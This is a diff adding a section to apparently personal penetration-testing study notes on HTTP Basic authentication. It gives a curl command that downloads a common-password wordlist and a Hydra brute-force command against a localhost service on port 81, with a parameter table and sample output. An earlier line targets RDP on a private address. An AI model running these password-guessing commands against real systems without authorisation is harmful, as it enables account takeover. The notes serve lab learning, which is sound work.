@@ -366,3 +366,41 @@ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX
 ✅ Targets the RDP service on `192.168.1.100`  
 
 
+---
+
+# **Basic HTTP Authentication & Hydra Brute-Forcing**
+
+## **Understanding Basic Auth**
+- A simple authentication method where credentials (username:password) are encoded in Base64.
+- Credentials are sent in the `Authorization` header as:  
+  ```
+  Authorization: Basic <encoded_credentials>
+  ```
+- Vulnerable to brute-force attacks as credentials are only encoded, not encrypted.
+
+## **Hydra Brute-Force Attack on Basic Auth**
+### **Download a Wordlist (if needed)**
+```bash
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+```
+
+### **Hydra Command Breakdown**
+```bash
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+```
+#### **Explanation:**
+| Parameter | Description |
+|-----------|------------|
+| `-l basic-auth-user` | Specifies the username (`basic-auth-user`) |
+| `-P 2023-200_most_used_passwords.txt` | Uses the given password wordlist |
+| `127.0.0.1` | Target IP (localhost in this case) |
+| `http-get /` | Targets an HTTP service with GET requests on `/` (root path) |
+| `-s 81` | Specifies port `81` instead of the default `80` |
+
+### **Expected Output**
+- Hydra will attempt each password from the list.
+- Once a valid password is found, it will be displayed.
+- Example:
+  ```
+  [81][http-get] host: 127.0.0.1   login: basic-auth-user   password: found-password
+  ```
